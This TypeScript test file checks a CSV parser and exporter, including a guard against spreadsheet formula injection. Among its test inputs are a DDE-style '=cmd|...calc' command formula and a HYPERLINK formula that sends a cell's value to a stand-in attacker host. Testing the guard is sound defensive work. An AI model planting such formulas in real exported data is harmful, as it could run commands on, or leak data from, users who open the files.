import { describe, expect, it } from "vitest";
import {
  MAX_CSV_BYTES,
  MAX_CSV_CELL_CHARS,
  MAX_CSV_COLUMNS,
  MAX_CSV_ROWS,
  csvCell,
  parseCsv,
  toCsv,
} from "@/lib/csv";

const ok = (text: string) => {
  const r = parseCsv(text);
  if (!r.ok) throw new Error(`parse failed: ${r.error}`);
  return r.data;
};
const refused = (text: string) => {
  const r = parseCsv(text);
  if (r.ok) throw new Error("expected a refusal");
  return r.error;
};

describe("parseCsv", () => {
  it("reads a header and rows, tolerating CRLF, a BOM and a trailing newline", () => {
    const p = ok("\uFEFFemail,first_name\r\na@b.io,Ada\r\nc@d.io,Grace\r\n");
    expect(p.header).toEqual(["email", "first_name"]);
    expect(p.rows).toEqual([
      { line: 2, cells: ["a@b.io", "Ada"] },
      { line: 3, cells: ["c@d.io", "Grace"] },
    ]);
    expect(p.errors).toEqual([]);
  });

  it("reads a last row that has no trailing newline", () => {
    expect(ok("email\na@b.io").rows).toEqual([{ line: 2, cells: ["a@b.io"] }]);
  });

  it("handles quoted fields with commas, newlines and doubled quotes", () => {
    const p = ok('a,b\n"x,1","he said ""hi""\nagain"\n');
    expect(p.rows[0]!.cells).toEqual(["x,1", 'he said "hi"\nagain']);
    // The embedded newline does not advance the reported line number of the
    // *next* row past the physical lines it consumed.
    expect(p.rows).toHaveLength(1);
  });

  it("counts physical lines, so a row after an embedded newline reports its own", () => {
    const p = ok('a\n"one\ntwo"\nthree\n');
    expect(p.rows).toEqual([
      { line: 2, cells: ["one\ntwo"] },
      { line: 4, cells: ["three"] },
    ]);
  });

  it("keeps empty cells and does not trim inside quotes", () => {
    const p = ok('a,b,c\n1,, " x "\n');
    expect(p.rows[0]!.cells).toEqual(["1", "", " x "]);
  });

  it("keeps the spaces in an unquoted cell", () => {
    expect(ok("a,b\n x , y \n").rows[0]!.cells).toEqual([" x ", " y "]);
  });

  it("skips blank lines without disturbing the line numbers after them", () => {
    const p = ok("email\n\na@b.io\n\n\nc@d.io\n");
    expect(p.rows).toEqual([
      { line: 3, cells: ["a@b.io"] },
      { line: 6, cells: ["c@d.io"] },
    ]);
  });

  it("refuses an unterminated quote — after it nothing can be trusted", () => {
    const error = refused('a\nb\n"never closed\n');
    expect(error).toMatch(/unterminated/i);
    expect(error).toMatch(/line 3/);
  });

  it("refuses an empty document and a header-only document is zero rows", () => {
    expect(parseCsv("").ok).toBe(false);
    expect(refused(",, \n1,2,3\n")).toMatch(/header/i);
    expect(ok("email\n").rows).toEqual([]);
  });

  it("refuses more than MAX_CSV_ROWS data rows", () => {
    const text = [
      "email",
      ...Array.from({ length: MAX_CSV_ROWS + 1 }, (_, i) => `a${i}@b.io`),
    ].join("\n");
    expect(refused(text)).toMatch(new RegExp(String(MAX_CSV_ROWS)));
  });

  it("refuses more than MAX_CSV_COLUMNS header columns", () => {
    const header = Array.from(
      { length: MAX_CSV_COLUMNS + 1 },
      (_, i) => `c${i}`,
    );
    expect(refused(`${header.join(",")}\n`)).toMatch(
      new RegExp(String(MAX_CSV_COLUMNS)),
    );
  });

  it("refuses a document over MAX_CSV_BYTES, measured in bytes not characters", () => {
    // Half as many characters as the byte cap, but two bytes each.
    expect(refused(`a\n${"é".repeat(MAX_CSV_BYTES / 2)}\n`)).toMatch(
      /at most .* bytes/i,
    );
  });

  it("pads a short row", () => {
    expect(ok("a,b,c\n1,2\n").rows[0]!.cells).toEqual(["1", "2", ""]);
  });

  it("reports an over-long row per row rather than failing the whole file", () => {
    const p = ok("a,b\n1,2\n3,4,5\n6,7\n");
    // The good rows still land; only the ragged one is held back, because a
    // stray comma shifts every value after it into the wrong column.
    expect(p.rows).toEqual([
      { line: 2, cells: ["1", "2"] },
      { line: 4, cells: ["6", "7"] },
    ]);
    expect(p.errors).toHaveLength(1);
    expect(p.errors[0]!.line).toBe(3);
    expect(p.errors[0]!.reason).toMatch(/3 values.*header has 2/);
  });

  it("reports a cell over MAX_CSV_CELL_CHARS per row, naming its column", () => {
    const p = ok(`email,note\na@b.io,${"x".repeat(MAX_CSV_CELL_CHARS + 1)}\n`);
    expect(p.rows).toEqual([]);
    expect(p.errors[0]!.line).toBe(2);
    expect(p.errors[0]!.reason).toMatch(/"note"/);
    expect(p.errors[0]!.reason).toMatch(new RegExp(String(MAX_CSV_CELL_CHARS)));
  });

  it("reverses the export guard but leaves a foreign leading apostrophe alone", () => {
    const p = ok("a,b,c,d\n'-1234,'Tis,''=x,'\n");
    expect(p.rows[0]!.cells).toEqual(["-1234", "'Tis", "'=x", "'"]);
  });
});

describe("csvCell", () => {
  it("neutralises formula injection on the four dangerous leaders", () => {
    for (const [raw, want] of [
      ["=1+1", "'=1+1"],
      ["+1", "'+1"],
      ["-1", "'-1"],
      ["@SUM(A1)", "'@SUM(A1)"],
      ["\tx", "'\tx"],
    ] as const)
      expect(csvCell(raw)).toBe(want);
  });

  it("escapes a leading apostrophe too, so the guard stays reversible", () => {
    expect(csvCell("'=1+1")).toBe("''=1+1");
    expect(csvCell("'Tis")).toBe("''Tis");
    // Nothing dangerous follows, so a lone apostrophe mid-value is untouched.
    expect(csvCell("it's")).toBe("it's");
  });

  it("quotes anything containing a quote, a comma or a newline", () => {
    expect(csvCell('he said "hi"')).toBe('"he said ""hi"""');
    expect(csvCell("a,b")).toBe('"a,b"');
    expect(csvCell("a\nb")).toBe('"a\nb"');
  });

  it("leaves an ordinary value alone", () => {
    expect(csvCell("ada@b.io")).toBe("ada@b.io");
    expect(csvCell("")).toBe("");
  });

  it("quotes *and* prefixes a value that is both dangerous and needs quoting", () => {
    expect(csvCell('=cmd|"/c calc"!A0')).toBe(`"'=cmd|""/c calc""!A0"`);
  });
});

describe("toCsv", () => {
  it("round-trips through parseCsv", () => {
    const text = toCsv(["email", "note"], [["a@b.io", 'x,"y"']]);
    expect(ok(text).rows[0]!.cells).toEqual(["a@b.io", 'x,"y"']);
  });

  it("ends with a newline so appending is safe", () => {
    expect(toCsv(["a"], [["1"]])).toBe("a\n1\n");
  });

  it("round-trips the values the injection guard rewrites", () => {
    const nasty = [
      '=HYPERLINK("http://evil.io?"&A1,"click")',
      "-1234",
      "+Plus",
      "@handle",
      "\tleading tab",
      "'=already guarded",
      "'Tis",
      "'",
      "it's fine",
      'quote " comma , newline \n and \r a CR',
      " leading and trailing ",
      "",
      "ordinary@example.com",
    ];
    const header = ["email", "value"];
    const rows = nasty.map((v, i) => [`a${i}@b.io`, v]);
    const parsed = ok(toCsv(header, rows));
    expect(parsed.header).toEqual(header);
    expect(parsed.errors).toEqual([]);
    expect(parsed.rows.map((r) => r.cells)).toEqual(rows);
  });

  it("stays stable across a second export/import cycle", () => {
    const rows = [
      ["a@b.io", "-1234"],
      ["c@d.io", "'=x"],
    ];
    const once = ok(toCsv(["email", "value"], rows)).rows.map((r) => r.cells);
    const twice = ok(toCsv(["email", "value"], once)).rows.map((r) => r.cells);
    expect(once).toEqual(rows);
    expect(twice).toEqual(rows);
  });
});
